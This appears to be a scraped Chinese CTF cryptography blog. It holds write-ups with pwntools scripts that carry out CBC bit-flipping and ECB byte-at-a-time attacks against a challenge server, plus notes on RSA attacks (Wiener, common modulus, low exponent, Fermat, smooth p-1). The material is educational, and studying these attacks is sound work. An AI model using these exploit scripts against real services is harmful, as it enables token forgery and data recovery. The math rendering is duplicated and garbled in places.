1+p3p+p2=(1+p)∗(p2−p+1)p∗(1+p)=p2−p+1p\\frac{1+p^3}{p+p^2} = \\frac{(1+p)*(p^2-p+1)}{p*(1+p)} = \\frac{p^2-p+1}{p}p+p21+p3​=p∗(1+p)(1+p)∗(p2−p+1)​=pp2−p+1​ 这里b/x的值为素数，尝试作为p进行解密 12345678910111213141516import gmpy2from Crypto.Util.number import *c = 0x7a7e031f14f6b6c3292d11a41161d2491ce8bcdc67ef1baa9ee = 0x872a335#q + q*p^3 = 1285367317452089980789441829580397855321901891350429414413655782431779727560841427444135440068248152908241981758331600586#qp + q *p^2 = 1109691832903289208389283296592510864729403914873734836011311325874120780079555500202475594a = 1285367317452089980789441829580397855321901891350429414413655782431779727560841427444135440068248152908241981758331600586b = 1109691832903289208389283296592510864729403914873734836011311325874120780079555500202475594x = gmpy2.gcd(a, b)p = b // xq = b // (p + p ** 2)n = p * qphi = (p - 1) * (q - 1)d = gmpy2.invert(e, phi)m = pow(c, d, n)print(long_to_bytes(m)) Yusa的密码学课堂 CBC第一课 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960from Crypto.Cipher import AESimport osflag=&#x27;flag&#123;********************************&#125;&#x27;BLOCKSIZE = 16def pad(data): pad_len = BLOCKSIZE - (len(data) % BLOCKSIZE) if len(data) % BLOCKSIZE != 0 else 0 return data + &quot;=&quot; * pad_lendef unpad(data): return data.replace(&quot;=&quot;,&quot;&quot;)def enc(data,key,iv): cipher = AES.new(key, AES.MODE_CBC, iv) encrypt = cipher.encrypt(pad(data)) return encryptdef dec(data,key,iv): try: cipher = AES.new(key, AES.MODE_CBC, iv) encrypt = cipher.decrypt(data) return unpad(encrypt) except: exit()def task(): try: key = os.urandom(16) iv = os.urandom(16) pre = &quot;yusa&quot;*4 for _ in range(3): choice = raw_input(menu) if choice == &#x27;1&#x27;: name = raw_input(&quot;What&#x27;s your name?&quot;) if name == &#x27;admin&#x27;: exit() token = enc(pre+name,key,iv) print &quot;Here is your token(in hex): &quot; + iv.encode(&#x27;hex&#x27;) + token.encode(&#x27;hex&#x27;) continue elif choice == &#x27;2&#x27;: token = raw_input(&quot;Your token(in hex): &quot;).decode(&#x27;hex&#x27;) iv = token[:16] name = dec(token[16:],key,iv) print iv.encode(&#x27;hex&#x27;) + name.encode(&#x27;hex&#x27;) if name[:16] == &quot;yusa&quot;*4: print &quot;Hello, &quot; + name[16:] if name[16:] == &#x27;admin&#x27;: print flag exit() else: continue except: exit()menu=&#x27;&#x27;&#x27;1. register2. login3. exit&#x27;&#x27;&#x27;if __name__ == &quot;__main__&quot;: task() CBC Byte Flip 如图所示 我们要把plain2中的某一字节翻转为另一字节 由于C1来自于cipher2进行Block Cipher Decryption之后的结果 而且key未知，就不能直接得知C1的值 但是字节翻转的妙处在于通过修改上一组的密文来翻转下一组的明文，从而可以完全忽视这一点 由异或运算可以推导 B1 = A1 xor C1 那么也有C1 = A1 xor B1 B1’ = A1’ xor C1 (A1’是修改之后的密文字节，B1’是翻转之后的明文字节) 而如果我们能够修改cipher1，那么就能够修改A1的值 即A1’ = A1 xor B1 xor B1’ A1’ xor C1 = A1 xor B1 xor B1’ xor C1 = C1 xor B1’ xor C1 = B1’ 用三条算式来表述上面的话就是 B = A xor C B’ = A’ xor C A’ = A xor B xor B’ 字节翻转的要求也就显而易见了 对于A完全可控 已知B的值 到这里也只完成了一半 由于修改了A1 cipher1在进行BCD的时候会得出错误的结果 再与IV相异或则会导致plain1出错 如果能够得到修改A1之后产生的错误的plain1的值 而且IV可以完全控制的话 那么就能够把刚才的把戏再玩一遍 B2 = A2 xor C2 B2’ = A2’ xor C2 A2’ = A2 xor B2 xor B2’ A2为原IV B2是错误的plain1 B2’是正确的plain1 BTW:每一组Cipher的长度为16Byte 以上大概介绍了CBC字节翻转的攻击方式 需要密文以及IV可控来改写明文 12345678910111213141516171819202122232425262728293031323334353637383940from pwn import *import binasciiimport timep = remote(&#x27;das.wetolink.com&#x27;,42888) # 连接p.recvuntil(b&quot;3. exit\\n&quot;)p.sendline(b&quot;1&quot;) # 注册p.recv()p.sendline(b&quot;Admin&quot;) # 用户名为Admin，方便之后修改data0 = p.recvline().decode()data0 = data0[28:124] # 提取返回数据部分iv0 = data0[:32] #返回的IVcipher00 = data0[32:64] #&quot;yusayusayusayusa&quot;的加密结果cipher01 = data0[64:96] #&quot;Admin&quot;的加密结果replacement = str(hex(int(cipher00[:2], 16) ^ ord(&quot;A&quot;) ^ ord(&quot;a&quot;)))[2:] # 计算替换密文的值payload0 = iv0 + replacement + cipher00[2:] + cipher01 # 发送替换密文#print(&quot;data0: &quot; + data0)#print(&quot;payload0: &quot; + payload0)p.recvuntil(b&quot;3. exit\\n&quot;)p.sendline(b&quot;2&quot;) # 登入p.recv()p.sendline(payload0.encode()) # 发送Payload0data1 = p.recvline()[:-1].decode() # 得到返回的数据plain1 = data1[32:64] # &quot;yusayusayusayusa&quot;由于密文被替换，解出来的明文是错误的，之后可以进行异或修改#print(&quot;data1: &quot; + data1)#print(&quot;plain1: &quot; + plain1)iv1 = str(hex(int(binascii.hexlify(&quot;yusa&quot;.encode()).decode() * 4,16) ^ int(plain1, 16) ^ int(iv0, 16)))[2:] # 计算IV，用于修改错误的明文#print(&quot;iv1: &quot;,iv1)payload1 = iv1 + replacement + cipher00[2:] + cipher01#print(&quot;payload1: &quot; + payload1)p.recvuntil(b&quot;3. exit\\n&quot;)p.sendline(b&quot;2&quot;) # 登入p.recv()p.sendline(payload1.encode()) # 发送Payload1p.recvuntil(b&quot;admin\\n&quot;)print(p.recvline()) # 得到flag Yusa的密码学课堂 ECB 1234567891011121314151617181920212223242526272829303132333435363738from Crypto.Cipher import AESimport osBLOCKSIZE = 16flag=&#x27;flag&#123;********************************&#125;&#x27;def pad(data): pad_len = BLOCKSIZE - (len(data) % BLOCKSIZE) if len(data) % BLOCKSIZE != 0 else 0 return data + chr(pad_len) * pad_lendef unpad(data): num = ord(data[-1]) return data[:-num]def enc(data,key): cipher = AES.new(key, AES.MODE_ECB) encrypt = cipher.encrypt(pad(data)) return encryptdef dec(data,key): try: cipher = AES.new(key, AES.MODE_ECB) encrypt = cipher.decrypt(data) return unpad(encrypt) except: exit()def task(): try: key = os.urandom(16) while True: plaintext = raw_input(&quot;Amazing function: &quot;).decode(&#x27;hex&#x27;) yusa = plaintext + flag print enc(yusa,key).encode(&#x27;hex&#x27;) except Exception as e: print str(e) exit()if __name__ == &quot;__main__&quot;: task() 这里的加密的明文为&quot;输入的hex转字符&quot;+“flag”+Padding 如果发送的明文为 aaaaaaaaaaaa 那么加密的明文为 aaaaaaaaaaaaflag&#123;XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX&#125; 分组Padding之后的结果为 aaaaaaaaaaaaflag &#123;XXXXXXXXXXXXXXX XXXXXXXXXXXXXXXX X&#125;+Padding 分析pad函数我们可以知道Padding的值 而ECB的加密方式就是分组明文密文之间没有关联 那么我们就可以构造 “?}+Padding&quot;的明文去加密，?作为掩码，flag内容长度为32字节，目测是md5，所以字符集目测是&quot;0123456789abcdef” 然后我们在字符集里去爆破一位掩码，将得到的结果与加密结果的最后一个分组进行比较，若相同则我们得到了flag最后一位的字节 理解了上述内容之后就可以写一个循环来逐位爆破flag，每次初始填充的a多一位 a在变长的过程中需要注意明文长度会多出几个分组，从而导致密文也多出几个分组 12345678910111213141516171819202122232425262728293031323334353637from pwn import *import binasciiimport timeplain = &quot;flag&#123;********************************&#125;&quot;flag = &quot;&#125;&quot;BLOCKSIZE = 16char = &#x27;0123456789abcdef&#x27;p = remote(&#x27;das.wetolink.com&#x27;,42887)text = p.recv()for pad1 in range(12, 46): #print(&#x27;61&#x27;*pad1) p.sendline(&#x27;61&#x27;*pad1) text = p.recvline() print(len(text)) if len(text) &lt;= 147: res = text.decode()[-33:-1] elif len(text) &lt;= 179: res = text.decode()[-33-32:-1-32] else: res = text.decode()[-33-64:-1-64] #print(res) pad2 = (26-pad1)%16 #print(pad1) for j in char: time.sleep(0.1) payload = str(hex(ord(j)))[2:]+binascii.hexlify(flag.encode()).decode()+(&#x27;0&#x27;+str(hex(pad2)[2:]))*pad2 #print(payload) p.sendline(payload) text = p.recvline().decode() #print(text) if res == text[18:18+32]: flag = j + flag print(flag) breakflag = &quot;flag&#123;&quot; + flagprint(flag)","categories":[{"name":"WriteUp","slug":"WriteUp","permalink":"https://yoloyolo.top/categories/WriteUp/"}],"tags":[{"name":"Crypto","slug":"Crypto","permalink":"https://yoloyolo.top/tags/Crypto/"},{"name":"RSA","slug":"RSA","permalink":"https://yoloyolo.top/tags/RSA/"},{"name":"CBC","slug":"CBC","permalink":"https://yoloyolo.top/tags/CBC/"},{"name":"ECB","slug":"ECB","permalink":"https://yoloyolo.top/tags/ECB/"}]},{"title":"Crypto -- RSA","slug":"Crypto-RSA","date":"2021-01-14T13:07:07.000Z","updated":"2022-06-27T18:39:46.000Z","comments":true,"path":"2021/01/14/Crypto-RSA/","link":"","permalink":"https://yoloyolo.top/2021/01/14/Crypto-RSA/","excerpt":"RSA101 ppp, qqq为大素数 n=p∗qn = p*qn=p∗q phi=(p−1)∗(q−1)phi = (p-1)*(q-1)phi=(p−1)∗(q−1) eee为小于phiphiphi的素数 e∗d≡1mod phie*d ≡ 1 \\mod phie∗d≡1modphi eee, nnn为公钥; ddd, nnn为私钥 c≡memod nc ≡ m^e \\mod nc≡memodn m≡cdmod nm ≡ c^d \\mod nm≡cdmodn","text":"RSA101 ppp, qqq为大素数 n=p∗qn = p*qn=p∗q phi=(p−1)∗(q−1)phi = (p-1)*(q-1)phi=(p−1)∗(q−1) eee为小于phiphiphi的素数 e∗d≡1mod phie*d ≡ 1 \\mod phie∗d≡1modphi eee, nnn为公钥; ddd, nnn为私钥 c≡memod nc ≡ m^e \\mod nc≡memodn m≡cdmod nm ≡ c^d \\mod nm≡cdmodn dp &amp; dq m≡cdmod nm ≡ c^d \\mod nm≡cdmodn n=p∗qn = p*qn=p∗q dp≡dmod (p−1)d_p ≡ d \\mod (p-1)dp​≡dmod(p−1) dq=dmod (q−1)d_q = d \\mod (q-1)dq​=dmod(q−1) 通过ppp, qqq, dpd_pdp​, dqd_qdq​, ccc运算得出mmm m≡cdmod nm ≡ c^d \\mod nm≡cdmodn m≡cdmod (p∗q)m ≡ c^d \\mod (p*q)m≡cdmod(p∗q) mp≡cdmod pm_p ≡ c^d \\mod pmp​≡cdmodp mq≡cdmod qm_q ≡ c^d \\mod qmq​≡cdmodq cd=mp+kp∗pc^d = m_p+k_p*pcd=mp​+kp​∗p cd=mq+kq∗pc^d = m_q+k_q*pcd=mq​+kq​∗p 结合两者可得 mq+kq∗q=mp+kp∗pm_q+k_q*q = m_p+k_p*pmq​+kq​∗q=mp​+kp​∗p mq≡mp+kp∗pmod qm_q ≡ m_p+k_p*p \\mod qmq​≡mp​+kp​∗pmodq kp∗p≡mq−mpmod qk_p*p ≡ m_q-m_p \\mod qkp​∗p≡mq​−mp​modq kp≡(mq−mp)∗p−1mod qk_p ≡ (m_q-m_p)*p^{-1} \\mod qkp​≡(mq​−mp​)∗p−1modq 其中 p−1∗p≡1mod qp^{-1}*p ≡ 1 \\mod qp−1∗p≡1modq 代入下式 cd=mp+kp∗pc^d = m_p+k_p*pcd=mp​+kp​∗p 可得 cd=(((mq−mp)∗p−1)%q)∗p+mpc^d = (((m_q-m_p)*p^{-1})\\%q)*p+m_pcd=(((mq​−mp​)∗p−1)%q)∗p+mp​ m≡cdmod n≡(((mq−mp)∗p−1)%q)∗p+mpmod nm ≡ c^d \\mod n ≡ (((m_q-m_p)*p^{-1})\\%q)*p+m_p \\mod nm≡cdmodn≡(((mq​−mp​)∗p−1)%q)∗p+mp​modn 对于mpm_pmp​, mqm_qmq​ mp≡cdmod pm_p ≡ c^d \\mod pmp​≡cdmodp mp≡cdp+k∗(p−1)mod pm_p ≡ c^{d_p+k*(p-1)} \\mod pmp​≡cdp​+k∗(p−1)modp mp≡cdp∗ck∗(p−1)mod pm_p ≡ c^{d_p}*c^{k*(p-1)} \\mod pmp​≡cdp​∗ck∗(p−1)modp 费马小定理（p为素数）： ap−1≡1mod pa^{p-1} ≡ 1 \\mod pap−1≡1modp 则 ck∗(p−1)≡1mod pc^{k*(p-1)} ≡ 1 \\mod pck∗(p−1)≡1modp mp≡cdpmod pm_p ≡ c^{d_p} \\mod pmp​≡cdp​modp 同理 mq≡cdqmod qm_q ≡ c^{d_q} \\mod qmq​≡cdq​modq m≡cdmod n≡((((cdq%q)−(cdp%p))∗p−1)%q)∗p+(cdp%p)mod nm ≡ c^d \\mod n ≡ ((((c^{d_q}\\%q)-(c^{d_p}\\%p))*p^{-1})\\%q)*p+(c^{d_p}\\%p) \\mod nm≡cdmodn≡((((cdq​%q)−(cdp​%p))∗p−1)%q)∗p+(cdp​%p)modn 可能存在的非预期 m&lt;pm &lt; pm&lt;p m≡cdmod nm ≡ c^d \\mod nm≡cdmodn m≡cdmod (p∗q)m ≡ c^d \\mod (p*q)m≡cdmod(p∗q) m+k∗p∗q=cdm+k*p*q = c^dm+k∗p∗q=cd m+k∗p∗q=cdmod pm+k*p*q = c^d \\mod pm+k∗p∗q=cdmodp m≡cdmod pm ≡ c^d \\mod pm≡cdmodp m≡cdp+k∗(p−1)mod pm ≡ c^{d_p+k*(p-1)} \\mod pm≡cdp​+k∗(p−1)modp m≡cdp∗ck∗(p−1)mod pm ≡ c^{d_p}*c^{k*(p-1)} \\mod pm≡cdp​∗ck∗(p−1)modp m≡cdpmod pm ≡ c^{d_p} \\mod pm≡cdp​modp dp &amp; dq &amp; dr 在三素数（n=p∗q∗rn = p*q*rn=p∗q∗r）的情况下，给出ppp, qqq, rrr, dpd_pdp​, dqd_qdq​, drdrdr, nnn, ccc来求解mmm 其中 dp≡dmod (p−1)d_{p} ≡ d \\mod (p-1)dp​≡dmod(p−1) dq≡dmod (q−1)d_{q} ≡ d \\mod (q-1)dq​≡dmod(q−1) dr≡dmod (r−1)d_{r} ≡ d \\mod (r-1)dr​≡dmod(r−1) 公式不变 m≡cdmod n≡(((mq−mp)∗p−1)%q)∗p+mpmod nm ≡ c^d \\mod n ≡ (((m_q-m_p)*p^{-1})\\%q)*p+m_p \\mod nm≡cdmodn≡(((mq​−mp​)∗p−1)%q)∗p+mp​modn m≡cdmod n≡((((cdq%q)−(cdp%p))∗p−1)%q)∗p+(cdp%p)mod nm ≡ c^d \\mod n ≡ ((((c^{d_q}\\%q)-(c^{d_p}\\%p))*p^{-1})\\%q)*p+(c^{d_p}\\%p) \\mod nm≡cdmodn≡((((cdq​%q)−(cdp​%p))∗p−1)%q)∗p+(cdp​%p)modn joker 在三素数（n=p∗q∗rn = p*q*rn=p∗q∗r）的情况下，给出ppp, qqq, rrr, dpd_pdp​, dqd_qdq​, drdrdr, nnn, ccc来求解mmm 其中 dp=d%((q−1)∗(r−1))d_p = d \\% ((q-1)*(r-1))dp​=d%((q−1)∗(r−1)) dq=d%((p−1)∗(r−1))d_q = d \\% ((p-1)*(r-1))dq​=d%((p−1)∗(r−1)) dr=d%((p−1)∗(q−1))d_r = d \\% ((p-1)*(q-1))dr​=d%((p−1)∗(q−1)) d=dp+k∗(q−1)∗(r−1)d = d_p+k*(q-1)*(r-1)d=dp​+k∗(q−1)∗(r−1) mp≡cdmod (q∗r)m_p ≡ c^d \\mod (q*r)mp​≡cdmod(q∗r) mp≡cdp+k∗(q−1)∗(r−1)mod (q∗r)m_p ≡ c^{d_p+k*(q-1)*(r-1)} \\mod (q*r)mp​≡cdp​+k∗(q−1)∗(r−1)mod(q∗r) mp≡cdp∗ck∗(q−1)∗(r−1)mod (q∗r)m_p ≡ c^{d_p}*c^{k*(q-1)*(r-1)} \\mod (q*r)mp​≡cdp​∗ck∗(q−1)∗(r−1)mod(q∗r) mp≡cdpmod (q∗r)m_p ≡ c^{d_p} \\mod (q*r)mp​≡cdp​mod(q∗r) 同理可得 mq≡cdqmod (p∗r)m_q ≡ c^{d_q} \\mod (p*r)mq​≡cdq​mod(p∗r) cd≡mp+kp∗q∗rc^d ≡ m_p+k_p*q*rcd≡mp​+kp​∗q∗r cd≡mq+kq∗p∗rc^d ≡ m_q+k_q*p*rcd≡mq​+kq​∗p∗r mp+kp∗q∗r=mq+kq∗p∗rm_p+k_p*q*r = m_q+k_q*p*rmp​+kp​∗q∗r=mq​+kq​∗p∗r mq−mp=(kp∗q−kq∗p)∗rm_q-m_p = (k_p*q-k_q*p)*rmq​−mp​=(kp​∗q−kq​∗p)∗r kp∗q∗r≡mq−mpmod pk_p*q*r ≡ m_q-m_p \\mod pkp​∗q∗r≡mq​−mp​modp kp≡(mq−mp)∗q−1∗r−1mod pk_p ≡ (m_q-m_p)*q^{-1}*r^{-1} \\mod pkp​≡(mq​−mp​)∗q−1∗r−1modp cd=mp+kp∗q∗rc^d = m_p+k_p*q*rcd=mp​+kp​∗q∗r cd=mp+(((mq−mp)∗q−1∗r−1)%p)∗q∗r+mpc^d = m_p+(((m_q-m_p)*q^{-1}*r^{-1})\\% p)*q*r+m_pcd=mp​+(((mq​−mp​)∗q−1∗r−1)%p)∗q∗r+mp​ m≡cdmod n≡(((mq−mp)∗q−1∗r−1)%p)∗q∗r+mpmod nm ≡ c^d \\mod n ≡ (((m_q-m_p)*q^{-1}*r^{-1})\\%p)*q*r+m_p \\mod nm≡cdmodn≡(((mq​−mp​)∗q−1∗r−1)%p)∗q∗r+mp​modn m≡cdmod n≡((((cdq%(p∗r))−(cdp%(q∗r)))∗q−1∗r−1)%p)∗q∗r+(cdp%(q∗r))mod nm ≡ c^d \\mod n ≡ ((((c^{d_q}\\%(p*r))-(c^{d_p}\\%(q*r)))*q^{-1}*r^{-1})\\%p)*q*r+(c^{d_p}\\%(q*r)) \\mod nm≡cdmodn≡((((cdq​%(p∗r))−(cdp​%(q∗r)))∗q−1∗r−1)%p)∗q∗r+(cdp​%(q∗r))modn dp 通过eee, dpd_pdp​, nnn, ccc来求解mmm e∗d≡1mod (p−1)∗(q−1)e*d ≡ 1 \\mod (p-1)*(q-1)e∗d≡1mod(p−1)∗(q−1) e∗d=1+k1∗(p−1)∗(q−1)e*d = 1+ k_1*(p-1)*(q-1)e∗d=1+k1​∗(p−1)∗(q−1) e∗(dp+k2∗(p−1))=1+k1∗(p−1)∗(q−1)e*(d_p+k_2*(p-1)) = 1+ k_1*(p-1)*(q-1)e∗(dp​+k2​∗(p−1))=1+k1​∗(p−1)∗(q−1) e∗dp+e∗k2∗(p−1)=1+k1∗(p−1)∗(q−1)e*d_p+e*k_2*(p-1) = 1 + k_1*(p-1)*(q-1)e∗dp​+e∗k2​∗(p−1)=1+k1​∗(p−1)∗(q−1) e∗dp≡1mod (p−1)e*d_p ≡ 1 \\mod (p-1)e∗dp​≡1mod(p−1) e∗dp−1=k∗(p−1)e*d_p-1 = k*(p-1)e∗dp​−1=k∗(p−1) k=e∗dp−1p−1&lt;e∗dpp−1&lt;e∗(p−1)p−1=ek = \\frac{e*d_p-1}{p-1} &lt; \\frac{e*d_p}{p-1} &lt; \\frac{e*(p-1)}{p-1} = ek=p−1e∗dp​−1​&lt;p−1e∗dp​​&lt;p−1e∗(p−1)​=e 则可以遍历(2,eee) 123for i in range(2, e): if (e * d_p - 1) % i == 0: k = i p=e∗dp−1k+1p = \\frac{e*d_p-1}{k} + 1p=ke∗dp​−1​+1 q=npq = \\frac{n}{p}q=pn​ phi=(p−1)∗(q−1)phi = (p-1)*(q-1)phi=(p−1)∗(q−1) d≡e−1mod phid ≡ e^{-1} \\mod phid≡e−1modphi m≡cdmod nm ≡ c ^ d \\mod nm≡cdmodn 共模 {c1≡me1mod nc2≡me2mod n\\begin{cases} c_1 ≡ m^{e_1} \\mod n \\\\ c_2 ≡ m^{e_2} \\mod n \\\\ \\end{cases} {c1​≡me1​modnc2​≡me2​modn​ 给出c1c_1c1​, c2c_2c2​, e1e_1e1​, e2e_2e2​来求解mmm gce(e1,e2)=1gce(e_1, e_2) = 1gce(e1​,e2​)=1 使用EEA可得 s1∗e1+s2∗e2=1s_1*e_1+s_2*e_2 = 1s1​∗e1​+s2​∗e2​=1 c1s1∗c2s2≡me1∗s1∗me2∗s2≡me1∗s1+e2∗s2≡mmod nc_1^{s_1}*c_2^{s_2} ≡ m^{e_1*s_1}*m^{e_2*s_2} ≡ m^{e_1*s_1+e_2*s_2} ≡ m \\mod nc1s1​​∗c2s2​​≡me1​∗s1​∗me2​∗s2​≡me1​∗s1​+e2​∗s2​≡mmodn 但是s1s_1s1​, s2s_2s2​中有一个为负数 模运算的负数次幂运算如下（假设s1s_1s1​为负数） c1s1≡(c1−1)−s1mod nc_1^{s_1} ≡ (c_1^{-1})^{-s_1}\\mod nc1s1​​≡(c1−1​)−s1​modn 1234567891011s = gmpy2.gcdext(e1, e2)if s[1] &lt; 0: s1 = -s[1] s2 = s[2] c1_ = gmpy2.invert(c1, n) m = (pow(c1_, s1, n) * pow(c2, s2, n)) % nelif s[2] &lt; 0: s1 = s[1] s2 = -s[2] c2_ = gmpy2.invert(c2, n) m = (pow(c1, s1, n) * pow(c2_, s2, n)) % n 低指数 eee很小，存在两种情况 c=me&lt;nc = m^e &lt; nc=me&lt;n 则可以直接开方 m=cem = \\sqrt[e]{c}m=ec​ c=me&gt;nc = m^e &gt; nc=me&gt;n c+k∗n=mec+k*n = m^ec+k∗n=me m=k∗n+cem = \\sqrt[e]{k*n+c}m=ek∗n+c​ 枚举k即可解出明文 1234for i in range(0, 100): k = gmpy2.iroot(i * n + c, e) if k[1] == True: m = k[0] 低解密指数 – wiener 理论推导部分省略 结论为当 d&lt;13N14d &lt; \\frac{1}{3}N^{\\frac{1}{4}}d&lt;31​N41​ 成立时 ∣en−kd∣&lt;12d2|\\frac{e}{n} - \\frac{k}{d}| &lt; \\frac{1}{2d^{2}}∣ne​−dk​∣&lt;2d21​ 成立 其中 e∗d=k∗ϕ(n)+1e*d = k*\\phi(n) + 1e∗d=k∗ϕ(n)+1 则 kd\\frac{k}{d}dk​ 的值在 en\\frac{e}{n}ne​的连分数渐进值中存在 以eee = 17993, nnn = 90581为例 欧几里得算法流程如下 17993=0∗90851+1799317993 = 0*90851 + 1799317993=0∗90851+17993 90581=5∗17993+61690581 = 5*17993 + 61690581=5∗17993+616 17993=29∗616+12917993 = 29*616 + 12917993=29∗616+129 616=4∗129+100616 = 4*129 + 100616=4∗129+100 129=1∗100+29129 = 1*100 + 29129=1∗100+29 100=3∗29+13100 = 3*29 + 13100=3∗29+13 29=2∗13+329 = 2*13 + 329=2∗13+3 13=4∗3+113 = 4*3 + 113=4∗3+1 3=3∗1+03 = 3*1 + 03=3∗1+0 得到的商数集为 [0,5,29,4,1,3,2,4,3][0, 5, 29, 4, 1, 3, 2, 4, 3][0,5,29,4,1,3,2,4,3] 则 en\\frac{e}{n}ne​ 的连分数形式为 1799390581=0+15+129+14+11+13+12+14+13\\frac{17993}{90581} = 0+\\cfrac{1}{5+\\cfrac{1}{29+\\cfrac{1}{4+\\cfrac{1}{1+\\cfrac{1}{3+\\cfrac{1}{2+\\cfrac{1}{4+\\cfrac{1}{3}}}}}}}}9058117993​=0+5+29+4+1+3+2+4+31​1​1​1​1​1​1​1​ 可求得连分数渐进值为 [0,15,29146,117589,146735,5552794,12566323,557928086,1799390581][0, \\frac{1}{5}, \\frac{29}{146}, \\frac{117}{589}, \\frac{146}{735}, \\frac{555}{2794}, \\frac{1256}{6323}, \\frac{5579}{28086}, \\frac{17993}{90581}][0,51​,14629​,589117​,735146​,2794555​,63231256​,280865579​,9058117993​] 则遍历收敛即可得到(k,d)(k, d)(k,d)的值 通过韦达定理可以进行进一步的判别 n=p∗qn = p*qn=p∗q ϕ(n)=e∗d−1k=(p−1)∗(q−1)\\phi(n) = \\frac{e*d-1}{k} = (p-1)*(q-1)ϕ(n)=ke∗d−1​=(p−1)∗(q−1) n−ϕ(n)=p+q−1n - \\phi(n) = p+q-1n−ϕ(n)=p+q−1 设立方程式 x2+(n−ϕ(n)+1)∗x+n=0x^2 + (n-\\phi(n)+1)*x + n = 0x2+(n−ϕ(n)+1)∗x+n=0 x2+(p+q)∗x+p∗q=0x^2 + (p+q)*x + p*q = 0x2+(p+q)∗x+p∗q=0 如果 (p+q)2−4∗p∗q=y&gt;0(p+q)^2 - 4*p*q = y &gt; 0(p+q)2−4∗p∗q=y&gt;0成立 且 y\\sqrt{y}y​ 的结果为正整数 则ddd为正确值 且可以求出ppp, qqq 补充 ∣ab−cd∣&lt;12d2\\vert\\frac{a}{b} - \\frac{c}{d}\\vert &lt; \\frac{1}{2d^{2}}∣ba​−dc​∣&lt;2d21​ ∣ab−cd∣&lt;12b2\\vert\\frac{a}{b} - \\frac{c}{d}\\vert &lt; \\frac{1}{2b^{2}}∣ba​−dc​∣&lt;2b21​ 区别在于前者在ab\\frac{a}{b}ba​的趋近值中求cd\\frac{c}{d}dc​的值，后者在cd\\frac{c}{d}dc​的趋近值中求ab\\frac{a}{b}ba​的值 费马因式分解 对于任意一个奇数n，有n=a∗b=x2−y2=(x+y)∗(x−y)n = a*b = x^2-y^2 = (x+y)*(x-y)n=a∗b=x2−y2=(x+y)∗(x−y) 而在nnn的分解出的因数接近时，可以从 x=n+i,i∈Zx=\\sqrt{n}+i, i \\in{\\Bbb{Z}}x=n​+i,i∈Z 开始进行递增遍历 如果x2−nx^2-nx2−n的结果可以被完全开方，则x正确，且开方结果为y 即可得出aaa，bbb 若nnn为有四个因子，则存在两组aaa，bbb的值 低指数广播 {c1≡memod n1c2≡memod n2c3≡memod n3\\begin{cases} c_1 ≡ m^e \\mod n_1 \\\\ c_2 ≡ m^e \\mod n_2 \\\\ c_3 ≡ m^e \\mod n_3 \\\\ \\end{cases} ⎩⎪⎨⎪⎧​c1​≡memodn1​c2​≡memodn2​c3​≡memodn3​​ 且满足 me&lt;n1∗n2∗n3m^e &lt; n_1*n_2*n_3me&lt;n1​∗n2​∗n3​ 则可以使用中国剩余定理 {k1≡(n2∗n3)−1mod n1k2≡(n1∗n3)−1mod n2k3≡(n1∗n2)−1mod n3\\begin{cases} k_1 ≡ (n_2*n_3)^{-1} \\mod n_1 \\\\ k_2 ≡ (n_1*n_3)^{-1} \\mod n_2 \\\\ k_3 ≡ (n_1*n_2)^{-1} \\mod n_3 \\\\ \\end{cases} ⎩⎪⎨⎪⎧​k1​≡(n2​∗n3​)−1modn1​k2​≡(n1​∗n3​)−1modn2​k3​≡(n1​∗n2​)−1modn3​​ me=(n2∗n3∗k1∗c1+n1∗n3∗k2∗c2+n1∗n2∗k3∗c3)%(n1∗n2∗n3)m^e = (n_2*n_3*k_1*c_1+n_1*n_3*k_2*c_2+n_1*n_2*k_3*c_3)\\%(n_1*n_2*n_3)me=(n2​∗n3​∗k1​∗c1​+n1​∗n3​∗k2​∗c2​+n1​∗n2​∗k3​∗c3​)%(n1​∗n2​∗n3​) m=(n2∗n3∗k1∗c1+n1∗n3∗k2∗c2+n1∗n2∗k3∗c3)%(n1∗n2∗n3)em = \\sqrt[e]{(n_2*n_3*k_1*c_1+n_1*n_3*k_2*c_2+n_1*n_2*k_3*c_3)\\%(n_1*n_2*n_3)}m=e(n2​∗n3​∗k1​∗c1​+n1​∗n3​∗k2​∗c2​+n1​∗n2​∗k3​∗c3​)%(n1​∗n2​∗n3​)​ smooth number 若p-1的素因子均不大于b 那么p-1为 b-smooth number 遍历不大于b的素数aia_iai​ B=∏iaiB = \\prod_{i}{a_i}B=∏i​ai​ 则 B=k∗(p−1)B = k*(p-1)B=k∗(p−1) aB≡ak∗(p−1)≡1mod pa^B ≡ a^{k*(p-1)} ≡ 1 \\mod paB≡ak∗(p−1)≡1modp aB≡ak∗(p−1)≡xmod na^B ≡ a^{k*(p-1)} ≡ x \\mod naB≡ak∗(p−1)≡xmodn wiki中给出模除的计算方法如下 dmod (abc)=(dmod a)+a[(d/a)mod b]+ab[(d/a/b)mod c]d \\mod (abc) = (d \\mod a) + a[(d / a) \\mod b] + ab[(d / a / b) \\mod c]dmod(abc)=(dmoda)+a[(d/a)modb]+ab[(d/a/b)modc] aB≡ak∗(p−1)≡xmod (p∗q)a^B ≡ a^{k*(p-1)} ≡ x \\mod (p*q)aB≡ak∗(p−1)≡xmod(p∗q) aB≡ak∗(p−1)≡xmod p+p∗(xpmod q)a^B ≡ a^{k*(p-1)} ≡ x \\mod p + p*(\\frac{x}{p} \\mod q)aB≡ak∗(p−1)≡xmodp+p∗(px​modq) aB=ak∗(p−1)=1+k∗pa^B = a^{k*(p-1)} = 1 + k*paB=ak∗(p−1)=1+k∗p gcd(aB−1,n)=gcd(k∗p,q∗p)=pgcd(a^{B}-1, n) = gcd(k*p, q*p) = pgcd(aB−1,n)=gcd(k∗p,q∗p)=p p（非预期） m&lt;pm &lt; pm&lt;p c≡memod nc ≡ m^e \\mod nc≡memodn c≡memod (p∗q)c ≡ m^e \\mod (p*q)c≡memod(p∗q) cp≡me≡cmod pc_p ≡ m^e ≡ c \\mod pcp​≡me≡cmodp e∗d≡1mod (p−1)e*d ≡ 1 \\mod (p-1)e∗d≡1mod(p−1) e∗d=k∗(p−1)+1e*d = k*(p-1)+1e∗d=k∗(p−1)+1 cpd≡me∗d≡mk∗(p−1)+1≡mmod pc_p^d ≡ m^{e*d} ≡ m^{k*(p-1)+1} ≡ m \\mod pcpd​≡me∗d≡mk∗(p−1)+1≡mmodp d q=nextprime(p)q = nextprime(p)q=nextprime(p) e∗d≡1mod phie*d ≡ 1 \\mod phie∗d≡1modphi e∗d−1=k∗phie*d-1 = k*phie∗d−1=k∗phi e∗d−1k=phi\\frac{e*d-1}{k} = phike∗d−1​=phi 